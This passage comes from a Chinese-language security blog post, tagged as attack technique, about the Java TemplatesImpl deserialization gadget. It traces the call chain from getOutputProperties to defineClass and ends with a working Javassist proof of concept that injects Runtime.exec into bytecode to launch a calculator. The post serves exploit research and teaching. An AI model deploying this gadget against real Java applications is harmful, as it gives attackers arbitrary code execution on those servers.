class=\"jop-noMdConv\">\n\n如上图所示，`_bytecodes`就是需要加载的字节码，它的类型是`byte[][]`，所以我们需要转换一下类型`new byte[][]{bytes}`\n\n<img src=\"/resources/0cad1041a8694bdc9b1201e80457a40f.png\" alt=\"bdc104cd62f05101c13850cceb23dffe.png\" width=\"420\" height=\"93\" class=\"jop-noMdConv\">\n\n`_tfactory`默认为null，如果为null的话在上图第二方框处就会报错，因为它是一个`TransformerFactoryImpl`类型的对象，所以我们只需要复制给它一个对象即可`new TransformerFactoryImpl()`\n\n<img src=\"/resources/09c3c4ed971f4a2f833790da7a070fdf.png\" alt=\"a8b7fc486a97cb4d9fc4265dc3fb9a15.png\" width=\"581\" height=\"84\" class=\"jop-noMdConv\">\n\n到这里，我们来尝试去加载一下这个类，这里可以使用`javasist`来生成`class`字节码并通过`CtClass#toBytecode`获取字节数组，也可以编写`.java`文件，进行获取，下边使用后者：\n\n编写被加载类`TestTemplatesImpl.java`：\n\n```java\npackage com.serializable.cc2;\n\n\nimport java.io.IOException;\n\npublic class TestTemplatesImpl {\n    static {\n        try {\n            Runtime.getRuntime().exec(\"calc\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    public TestTemplatesImpl() {\n    }\n}\n\n```\n\n然后通过反射赋值并执行`TemplatesImpl#defineTransletClasses`\n\n```java\npackage com.serializable.cc2;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\n\nimport java.lang.reflect.Method;\n\npublic class LoadTestTemp {\n    public static void main(String[] args) throws Exception {\n        ClassPool classPool = ClassPool.getDefault();\n        CtClass ctClass = classPool.getCtClass(\"com.serializable.cc2.TestTemplatesImpl\");\n        byte[] bytes = ctClass.toBytecode();\n        TemplatesImpl templates = new TemplatesImpl();\n        Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][]{bytes});\n        Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        Method defineTransletClasses = TemplatesImpl.class.getDeclaredMethod(\"defineTransletClasses\");\n        defineTransletClasses.setAccessible(true);\n        defineTransletClasses.invoke(templates);\n    }\n}\n```\n\n通过调试发现，这个类确实已经被加载了，但是最后并没有执行静态代码（当然，因为只是加载了这个类，并没有进行初始化）\n\n所以我们继续查看一下哪里调用了`TemplatesImpl#defineTransletClasses`\n\n<img src=\"/resources/71b078ed230642d2a7358e828cbcf6a2.png\" alt=\"e8ac967488bd785cacf18b9720b36c15.png\" width=\"588\" height=\"324\" class=\"jop-noMdConv\">\n\n一共有3个地方调用了`TemplatesImpl#defineTransletClasses`，但是发现在`getTransletInstance`这里进行了实例化操作，通过这里应该可以达到实现，我们来看一下执行条件：\n\n首先`_name`不能为`null`，通过反射赋值为任意`String`类型。\n\n`_class`需要是`null`（默认为null，无需更改）\n\n<img src=\"/resources/54369d89f368453584c81fc9fb682265.png\" alt=\"891d70b1b584adf9752aabb305a465fd.png\" width=\"460\" height=\"335\" class=\"jop-noMdConv\">\n\n继续往下看，接下来的`_class`变量在`TemplatesImpl#defineTransletClasses`执行过后会被加载入类。\n\n<img src=\"/resources/f134154622fc43b6b67c79e6db51651a.png\" alt=\"efe3d55bc8320a4371c8eebccfc427b3.png\" width=\"858\" height=\"298\" class=\"jop-noMdConv\">\n\n然后`_transletIndex`变量默认为`-1`。然后在`TemplatesImpl#defineTransletClasses`中也对这个变量进行了操作。\n\n<img src=\"/resources/1771d05f8aca429aa4103086ec27f07e.png\" alt=\"714afc003f2b7bbd613758c8ef783e74.png\" width=\"735\" height=\"88\" class=\"jop-noMdConv\"> <img src=\"/resources/dcbefb30951a4725b08a62d5c514fd88.png\" alt=\"566fa3c152c6e95b620069d46bdbbffb.png\" width=\"650\" height=\"118\" class=\"jop-noMdConv\">\n\n`superClass`变量即加载入的类的父类，如果父类为`AbstractTranslet`就会给`_transletIndex`赋值（也就是载入类在`_class`的位置）。\n\n所以，我们需要在之前的`TestTemplatesImpl.java`代码修改，让其继承`AbstractTranslet`，代码如下：\n\n```java\npackage com.serializable.cc2;\n\n\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\nimport java.io.IOException;\n\npublic class TestTemplatesImpl extends AbstractTranslet {\n    static {\n        try {\n            Runtime.getRuntime().exec(\"calc\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    public TestTemplatesImpl() {\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n}\n\n```\n\n还要给`_name`赋值，并执行`TemplatesImpl#getTransletInstance`\n\n```java\npackage com.serializable.cc2;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\n\nimport java.lang.reflect.Method;\n\npublic class LoadTestTemp {\n    public static void main(String[] args) throws Exception {\n        ClassPool classPool = ClassPool.getDefault();\n        CtClass ctClass = classPool.getCtClass(\"com.serializable.cc2.TestTemplatesImpl\");\n        byte[] bytes = ctClass.toBytecode();\n        TemplatesImpl templates = new TemplatesImpl();\n        Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][]{bytes});\n        Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        Reflections.setFieldValue(templates, \"_name\", \"seizer\");\n        Method defineTransletClasses = TemplatesImpl.class.getDeclaredMethod(\"getTransletInstance\");\n        defineTransletClasses.setAccessible(true);\n        defineTransletClasses.invoke(templates);\n    }\n}\n\n```\n\n执行后成功弹出计算器：\n\n<img src=\"/resources/749024596c0741c7b57781dab9ad8c95.png\" alt=\"782bd4ba6bcda0149f8a2865dae3050a.png\" width=\"891\" height=\"645\" class=\"jop-noMdConv\">\n\n之后还可以进一步改进一下代码，在`newTransformer`处调用了`getTransletInstance`\n\n<img src=\"/resources/1c0a09765d9d4ca5963e8faf06285300.png\" alt=\"131f2a45cc38eaa8a1ba2a4772410e7e.png\" width=\"723\" height=\"186\" class=\"jop-noMdConv\">\n\n并且该方法是一个`public`方法，不需要通过反射调用\n\n> 这里捎带看了下synchronized关键字，大概解释就是用于Java并发编程中保证多线程安全的，当synchronized关键字修饰一个方法的时候，该方法叫做同步方法，该方法执行完或发生异常时，会自动释放锁。\n\n所以我们可以直接调用`TemplatesImpl#newTransformer`也可以弹出计算器，进一步查找，看看还有没有其他方法。发现`getOutputProperties`方法中调用了`newTransformer`，这里应该依然可以成功弹出计算器，然后继续寻找无果，这条利用链也就到此结束了。\n\n<img src=\"/resources/20c5b4de481e4f0ca3ee5374a7df1607.png\" alt=\"5858701c679a53b30572594e5f63fb5b.png\" width=\"760\" height=\"221\" class=\"jop-noMdConv\">\n\n利用链如下：\n\n```\nTemplatesImpl#getOutputProperties->TemplatesImpl#newTransformer->TemplatesImpl#getTransletInstance->TemplatesImpl#defineTransletClasses->TransletClassLoader#defineClass\n\nTemplatesImpl#newTransformer->TemplatesImpl#getTransletInstance->TemplatesImpl#defineTransletClasses->TransletClassLoader#defineClass\n\nTemplatesImpl#getTransletInstance->TemplatesImpl#defineTransletClasses->TransletClassLoader#defineClass\n\n```\n\n# 最终POC\n\n```java\npackage com.serializable.cc2;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\n\npublic class LoadTestTemp {\n    public static void main(String[] args) throws Exception {\n        ClassPool classPool = ClassPool.getDefault();   // 获取CtClass容器\n        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 引入AbstractTranslet路径到classpath中\n        CtClass testCtClass = classPool.makeClass(\"TestCtClass\");   // 创建CtClass对象\n        testCtClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));    // 设置父类为AbstractTranslet\n        CtConstructor ctConstructor = testCtClass.makeClassInitializer();   // 创建空初始化构造器\n        ctConstructor.insertBefore(\"Runtime.getRuntime().exec(\\\"calc\\\");\"); // 插入初始化语句\n        byte[] bytes = testCtClass.toBytecode();    // 获取字节数据\n        TemplatesImpl templates = new TemplatesImpl();\n        Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][]{bytes});\n        Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        Reflections.setFieldValue(templates, \"_name\", \"seizer\");\n//        templates.newTransformer();\n        templates.getOutputProperties();\n    }\n}\n\n```\n\n效果图如下：\n\n<img src=\"/resources/1b13968b48ff4e9ead1720ec3457a2f1.png\" alt=\"04eba7b495adebf1b81405763e96e1e9.png\" width=\"813\" height=\"523\" class=\"jop-noMdConv\">","tags":["Java","反序列化"],"categories":["攻击技术"]}]